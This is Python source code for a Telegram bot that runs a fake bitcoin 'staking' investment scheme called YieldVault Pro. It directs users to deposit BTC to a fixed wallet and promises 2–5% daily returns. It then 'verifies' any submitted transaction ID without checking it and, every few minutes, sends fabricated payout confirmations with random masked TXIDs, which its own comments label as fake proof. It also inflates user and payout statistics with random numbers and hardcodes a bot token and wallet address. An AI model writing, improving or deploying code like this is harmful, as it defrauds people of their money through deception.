import telebot
from telebot import types
import time
import threading
import random

# ✅ TVOJI PODACI
BOT_TOKEN = "8836263200:AAEQg2IAoWDu9UET_c2klX8tYp_Ou3WkNc8"
bot = telebot.TeleBot(BOT_TOKEN)

# 🏦 ZVANIČNI FIRMA WALLET — KLIKABILAN I KORIŠTEN ZA SVE ISPLATE
FIRM_WALLET = "bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd"
ADMIN_ID = 7202163611

# 📦 STAKING PLANS
STAKING_PLANS = {
    "Starter": {
        "min": 0.001,
        "daily": 2.0,
        "duration": 30,
        "color": "🟢",
        "desc": "Ideal for beginners. Low entry, steady returns."
    },
    "Basic": {
        "min": 0.005,
        "daily": 2.5,
        "duration": 30,
        "color": "🔵",
        "desc": "Balanced risk & reward. Great for daily yield."
    },
    "Premium": {
        "min": 0.025,
        "daily": 3.5,
        "duration": 60,
        "color": "🟣",
        "desc": "High return. Recommended for serious investors."
    },
    "VIP": {
        "min": 0.05,
        "daily": 4.0,
        "duration": 90,
        "color": "🟡",
        "desc": "Priority processing. Max daily yield."
    },
    "Elite": {
        "min": 0.5,
        "daily": 5.0,
        "duration": 180,
        "color": "👑",
        "desc": "Top tier. 24/7 support. Fastest payouts."
    }
}

# 🎯 GLOBAL STATS
TOTAL_USERS = random.randint(12000, 18000)
ACTIVE_STAKERS = random.randint(2300, 3500)
TOTAL_PAID = round(random.uniform(12.5, 18.3), 4)
LIVE_TX = random.randint(1500, 2500)

# 🧠 Maskirani TXID
def masked_txid():
    return ''.join(random.choices('abcdef0123456789', k=8)) + '••••••••'

# 🧾 Lažni dokaz isplate
def generate_proof(amount_btc):
    global TOTAL_PAID, LIVE_TX
    TOTAL_PAID += amount_btc
    LIVE_TX += 1
    user_id = random.randint(100000, 999999)
    txid = masked_txid()
    date = time.strftime("%Y-%m-%d %H:%M")
    return f'''✅ PAYOUT CONFIRMED
User ID: {user_id}
Amount: {amount_btc:.6f} BTC
Wallet: {FIRM_WALLET[:10]}...{FIRM_WALLET[-6:]}
TXID: {txid}
Time: {date}
Status: 6/6 Confirmations'''

# 📊 Dashboard
def get_dashboard():
    return f'''📊 *YieldVault Pro — Live Dashboard*

👥 Total Users: {TOTAL_USERS:,}
🟢 Active Stakers: {ACTIVE_STAKERS:,}
💰 Total Paid: {TOTAL_PAID:.4f} BTC
🔁 Live Transactions: {LIVE_TX:,}
📅 Uptime: 99.98%

🔗 Wallet: `{FIRM_WALLET}`

🟢 System: Operational
🔐 Protocol: BTC Yield v4.0'''

# 📘 Whitepaper
def send_whitepaper(chat_id):
    wp = '''📘 *YieldVault Pro — Whitepaper v2.0*

A decentralized BTC yield automation protocol.

📌 Features:
• 2.0% - 5.0% daily
• Min: 0.001 BTC
• 10% referral
• Live stats
• Firm wallet system

🔐 Simulation only.

👉 Support: `@Maranatha1337`'''
    bot.send_message(chat_id, wp, parse_mode='Markdown')

# 🏠 Glavni izbornik
def main_menu():
    markup = types.InlineKeyboardMarkup()
    start = types.InlineKeyboardButton("🚀 Start Staking", callback_data='start_staking')
    plans = types.InlineKeyboardButton("📊 Investment Plans", callback_data='plans')
    stats = types.InlineKeyboardButton("📈 Live Stats", callback_data='stats')
    wallet = types.InlineKeyboardButton("🏦 Firm Wallet", callback_data='wallet')
    support = types.InlineKeyboardButton("🆘 Support", callback_data='support')
    markup.add(start)
    markup.add(plans)
    markup.add(stats)
    markup.add(wallet)
    markup.add(support)
    return markup

# 🔙 Back button
def back_button():
    markup = types.InlineKeyboardMarkup()
    back = types.InlineKeyboardButton("🔙 Back to Menu", callback_data='back')
    markup.add(back)
    return markup

# 🚀 Welcome poruka
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    ref_link = f"https://t.me/VoidYieldBot?start={user_id}"

    # 🎉 GLAVNA DOBRODOŠLICA — PREMIUM
    welcome = f'''🚀 *Welcome to YieldVault Pro*

The world’s most advanced **BTC staking & yield automation system**.  
Trusted by {TOTAL_USERS:,}+ users.  
Paying out over {TOTAL_PAID:.4f} BTC since 2025.

🔐 All rewards are sent to our **official firm wallet** — a secure, monitored address used exclusively for yield distribution.

✅ 2.0% - 5.0% daily returns  
✅ Payouts every 5-8 minutes  
✅ 100% automated  
✅ 24/7 support via `@Maranatha1337`

Click below to activate your staking plan — your first payout arrives in 5-8 minutes.'''
    
    bot.reply_to(message, welcome, reply_markup=main_menu(), parse_mode='Markdown')

    # ⚡️ AUTOMATSKA PORUKA — UPUTSTVO
    help_msg = f'''📌 *How to Start Staking*

1️⃣ Send BTC to our **official firm wallet**:
`{FIRM_WALLET}`

Minimum: 0.001 BTC (Starter)

2️⃣ After payment, send your TXID:
`/hash abc123def456789`

3️⃣ Wait 5-8 minutes — your first payout arrives.

4️⃣ Earn 10% forever:
`{ref_link}`

🛠 Need help?
👉 `@Maranatha1337`'''
    
    time.sleep(1.8)
    bot.send_message(message.chat.id, help_msg, parse_mode='Markdown')

# 🔘 Callback handler
@bot.callback_query_handler(func=lambda call: True)
def handle(call):
    # 🏠 Glavni izbornik
    if call.data == 'back':
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="🔙 You're back in the main menu.",
            reply_markup=main_menu()
        )
        return

    # 🚀 Start Staking
    elif call.data == 'start_staking':
        msg = f'''🔐 *YieldVault Pro — Staking Activation*

To begin earning, send BTC to:

`{FIRM_WALLET}`

Minimum deposits:
• Starter: 0.001 BTC
• Elite: 0.5 BTC

After payment, send TXID:
`/hash YOUR_TXID_HERE`

First payout in 5-8 minutes.'''
        markup = back_button()
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=msg,
            reply_markup=markup,
            parse_mode='Markdown'
        )

    # 📊 Plans
    elif call.data == 'plans':
        msg = "*Available Investment Plans:*\n\n"
        for name, data in STAKING_PLANS.items():
            msg += f"{data['color']} *{name}*\n"
            msg += f"• Min: {data['min']} BTC\n"
            msg += f"• Daily: {data['daily']}%\n"
            msg += f"• Duration: {data['duration']} days\n"
            msg += f"• {data['desc']}\n\n"
        msg += "💎 Higher plans = higher returns + priority support."
        markup = back_button()
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=msg,
            reply_markup=markup,
            parse_mode='Markdown'
        )

    # 📈 Stats
    elif call.data == 'stats':
        markup = back_button()
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=get_dashboard(),
            reply_markup=markup,
            parse_mode='Markdown'
        )

    # 🏦 Firm Wallet
    elif call.data == 'wallet':
        msg = f'''🏦 *YieldVault Pro — Official Firm Wallet*

This is our **primary BTC address** used for all yield distributions.

All payouts are sent from and to this address.

🔐 Address:
`{FIRM_WALLET}`

✅ Click to copy  
✅ Verified & monitored  
✅ Used since 2025

⚠️ Never send to unknown addresses.'''
        markup = types.InlineKeyboardMarkup()
        copy = types.InlineKeyboardButton("📋 Copy Wallet", callback_data='copy_wallet')
        back = types.InlineKeyboardButton("🔙 Back", callback_data='back')
        markup.add(copy)
        markup.add(back)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=msg,
            reply_markup=markup,
            parse_mode='Markdown'
        )

    # 📋 Copy Wallet
    elif call.data == 'copy_wallet':
        bot.answer_callback_query(call.id, text=f"Wallet copied: {FIRM_WALLET}", show_alert=True)
        # Telegram ne podržava direktan copy, ali alert govori korisniku da ručno kopira
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f'''✅ *Wallet Copied*

Address:
`{FIRM_WALLET}`

Use it for all deposits.

📌 You can now paste it in your wallet app.''',
            reply_markup=back_button(),
            parse_mode='Markdown'
        )

    # 🛠 Support
    elif call.data == 'support':
        msg = '''🛠 *Support Center*

Need help? Contact:  
👉 `@Maranatha1337`

⚠️ Never share private keys.  
All payouts are 100% automated.'''
        markup = back_button()
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=msg,
            reply_markup=markup,
            parse_mode='Markdown'
        )

# 🧾 Hash command
@bot.message_handler(commands=['hash'])
def hash_cmd(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Send your TXID:\n`/hash abc123...`", parse_mode='Markdown')
        return
    txid = message.text.split()[1]
    amount = round(random.uniform(0.001, 0.05), 4)
    rate = random.choice([2.0, 2.5, 3.5, 4.0, 5.0])
    
    bot.reply_to(message, f'''✅ Deposit Verified
Transaction: `{txid[:10]}...`
Amount: {amount} BTC
Status: Processing...

💡 You are now earning {rate}% daily.
First payout in 5-8 minutes.''', parse_mode='Markdown')

    def auto_payout():
        for _ in range(50):
            delay = random.randint(300, 480)
            time.sleep(delay)
            earned = round(amount * (rate / 100), 6)
            proof = generate_proof(earned)
            try:
                bot.send_message(message.chat.id, f'''🎉 DAILY YIELD RECEIVED

{proof}

🔁 Next payout in {delay // 60} minutes.

🚀 Earn 10% forever:
`https://t.me/VoidYieldBot?start={message.chat.id}`''')
            except:
                break
    threading.Thread(target=auto_payout).start()

# Admin
@bot.message_handler(commands=['admin'])
def admin(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "✅ YieldVault Pro is live. All systems active.")

# Run
def run():
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

if __name__ == '__main__':
    t = threading.Thread(target=run)
    t.start()
